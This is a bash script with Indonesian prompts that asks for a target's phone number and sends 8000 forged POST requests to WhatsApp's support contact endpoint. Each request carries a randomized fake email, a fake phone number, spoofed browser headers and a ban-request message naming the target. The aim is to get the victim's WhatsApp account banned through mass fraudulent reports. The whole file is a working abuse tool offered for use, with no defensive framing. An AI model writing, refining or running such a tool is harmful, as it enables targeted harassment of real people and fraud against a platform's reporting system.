clear
date
clear
#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Function to validate Indonesian phone numbers
is_valid_country_code() {
    local phone_number=$1
    if [[ $phone_number =~ ^(\+62|62)?[\s-]?[0-9]{9,13}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Loading bar function
show_loading_bar() {
    local bar_length=50
    local delay=0.01
    local step=2
    
    for ((i=0; i<=100; i+=step)); do
        filled=$((i * bar_length / 100))
        bar="["
        for ((j=0; j<bar_length; j++)); do
            if ((j < filled)); then
                bar+="="
            elif ((j == filled)); then
                bar+=">"
            else
                bar+=" "
            fi
        done
        bar+="]"
        printf "\r%s %d%%" "$bar" "$i"
        sleep $delay
    done

    if ((i != 100)); then
        filled=$((100 * bar_length / 100))
        bar="["
        for ((j=0; j<bar_length; j++)); do
            if ((j < filled)); then
                bar+="="
            else
                bar+=" "
            fi
        done
        bar+="]"
        printf "\r%s %d%%" "$bar" 100
    fi

    echo -e "\n${GREEN}Loading complete!${NC}\n"
}

# Display banner
echo -e "${CYAN}
${RED}█░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█
${WHITE}█▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█
${NC}"

# Main script
while true; do
    read -p "$(echo -e "${CYAN}[+] MASUKIN TARGET ${NC}")" user_input
    
    # Format phone number
    if [[ $user_input =~ ^62[0-9]+$ ]]; then
        user_input="+$user_input"
    elif [[ $user_input =~ ^0[0-9]+$ ]]; then
        user_input="+62${user_input:1}"
    fi
    
    if is_valid_country_code "$user_input"; then
        replacement_number=$user_input
        echo -e "${GREEN}Valid number: $replacement_number${NC}"
        show_loading_bar
        ban_file="message_ban_whatsapp.json"
        break
    else
        echo -e "${RED}Invalid phone number format! Please enter a valid Indonesian number${NC}"
    fi
done

num_requests=8000
echo -e "${CYAN}Memulai pengiriman ${RED}8000 request${CYAN} ke WhatsApp...${NC}"

# Check required files
if [ ! -f "$ban_file" ]; then
    echo -e "${RED}Error: $ban_file tidak ditemukan!${NC}"
    exit 1
fi

if [ ! -f "phones.db" ]; then
    echo -e "${RED}Error: phones.db tidak ditemukan!${NC}"
    exit 1
fi

if [ ! -f "ips.db" ]; then
    echo -e "${RED}Error: ips.db tidak ditemukan!${NC}"
    exit 1
fi

# Load ban messages
ban_messages=()
while IFS= read -r line; do
    if [[ "$line" =~ \"subject\":\"([^\"]+)\".*\"message\":\"([^\"]+)\" ]]; then
        subject=${BASH_REMATCH[1]}
        message=${BASH_REMATCH[2]}
        message=${message//\[###\]/$replacement_number}
        ban_messages+=("$subject%A0$message")
    fi
done < "$ban_file"

# Generate random email
generate_random_email() {
    local length=10
    local chars='abcdefghijklmnopqrstuvwxyz0123456789'
    local random_name=""
    for (( i=0; i<length; i++ )); do
        random_name+=${chars:$((RANDOM % ${#chars})):1}
    done
    echo "${random_name}@gmail.com"
}

# Generate random phone number based on country
generate_random_phone() {
    local country_selector=$1
    case $country_selector in
        "ID") echo "+628${RANDOM:0:2}${RANDOM:0:4}${RANDOM:0:4}" ;;
        "EG") echo "+201${RANDOM:0:9}" ;;
        "US") echo "+1${RANDOM:0:3}${RANDOM:0:3}${RANDOM:0:4}" ;;
        "KR") echo "+82${RANDOM:0:2}${RANDOM:0:4}${RANDOM:0:4}" ;;
        "CN") echo "+86${RANDOM:0:4}${RANDOM:0:4}${RANDOM:0:4}" ;;
        "IN") echo "+91${RANDOM:0:5}${RANDOM:0:5}" ;;
        *) echo "0123456789" ;;
    esac
}

# Main request function
send_requests() {
    local num_requests=$1
    local delay=$2
    
    # Read phones and IPs
    mapfile -t phones < "phones.db"
    mapfile -t ips < "ips.db"
    
    countries=("ID" "EG" "US" "KR" "CN" "IN")
    platforms=("ANDROID" "IPHONE" "WHATS_APP_WEB_DESKTOP" "KAIOS" "OTHER")
    
    for (( i=0; i<num_requests; i++ )); do
        # Select random values
        random_phone=${phones[$RANDOM % ${#phones[@]}]}
        random_ip=${ips[$RANDOM % ${#ips[@]}]}
        random_message=${ban_messages[$RANDOM % ${#ban_messages[@]}]}
        country_selector=${countries[$RANDOM % ${#countries[@]}]}
        platform=${platforms[$RANDOM % ${#platforms[@]}]}
        email=$(generate_random_email)
        phone_number=$(generate_random_phone "$country_selector")
        
        # Prepare data
        jazoest="20000$((RANDOM % 90000 + 10000))"
        __hsi=$((RANDOM % 9999999999999999999 + 1000000000000000000))
        __req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')
        __a=$((RANDOM % 1000000000 + 1))
        __rev=$((RANDOM % 9000000000 + 1000000000))
        
        # Send request using curl
        response=$(curl -s -k -X POST "https://www.whatsapp.com/contact/noclient/async/new/" \
            -H "Host: www.whatsapp.com" \
            -H "Cookie: wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz" \
            -H "Sec-Ch-Ua-Platform: \"Linux\"" \
            -H "Accept-Language: en-US,en;q=0.9" \
            -H "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" \
            -H "Sec-Ch-Ua-Mobile: ?0" \
            -H "X-Asbd-Id: 129477" \
            -H "X-Fb-Lsd: AVpbkNjZYpw" \
            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Accept: */*" \
            -H "Origin: https://www.whatsapp.com" \
            -H "Sec-Fetch-Site: same-origin" \
            -H "Sec-Fetch-Mode: cors" \
            -H "Sec-Fetch-Dest: empty" \
            -H "Referer: https://www.whatsapp.com/contact/noclient?" \
            -H "Accept-Encoding: gzip, deflate, br" \
            --data-urlencode "country_selector=$country_selector" \
            --data-urlencode "email=$email" \
            --data-urlencode "email_confirm=$email" \
            --data-urlencode "phone_number=$phone_number" \
            --data-urlencode "platform=$platform" \
            --data-urlencode "your_message=$random_message" \
            --data-urlencode "step=articles" \
            --data-urlencode "__user=0" \
            --data-urlencode "__a=$__a" \
            --data-urlencode "__req=$__req" \
            --data-urlencode "__hs=20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0" \
            --data-urlencode "dpr=1" \
            --data-urlencode "__ccg=UNKNOWN" \
            --data-urlencode "__rev=$__rev" \
            --data-urlencode "__s=ugvlz3%3A6skj2s%3A4yux6k" \
            --data-urlencode "__hsi=$__hsi" \
            --data-urlencode "__dyn=7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu" \
            --data-urlencode "__csr=" \
            --data-urlencode "lsd=AVpbkNjZYpw" \
            --data-urlencode "jazoest=$jazoest")
        
        # Check response
        if [[ -n "$response" ]]; then
            echo -e "${RED}request:${GREEN}($((i+1))) ${RED}device?:${GREEN}${random_phone} ${RED}IP:${GREEN}${random_ip} ${BLUE}-> ${WHITE}Email:${email} | Phone:${country_selector} ${phone_number} | Target -> ${replacement_number}"
            echo "$response" >> "logs.txt"
        else
            echo -e "${RED}${random_ip} $((i+1)) - Request failed${NC}"
        fi
        
        sleep "$delay"
    done
}

# Start sending requests
send_requests "$num_requests" 10
